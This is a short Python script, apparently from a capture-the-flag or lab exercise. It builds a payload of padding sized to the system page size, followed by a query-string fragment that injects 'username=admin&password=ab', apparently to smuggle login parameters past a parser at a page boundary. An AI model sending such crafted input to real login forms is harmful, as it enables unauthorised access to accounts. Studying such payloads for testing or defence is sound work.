import sys
import resource

x = "=x&username=admin&password=ab"

payload = "x" * (resource.getpagesize() - len(x)) + x

print(resource.getpagesize(), file=sys.stderr)
print(len(payload), file=sys.stderr)

print(payload, end="")
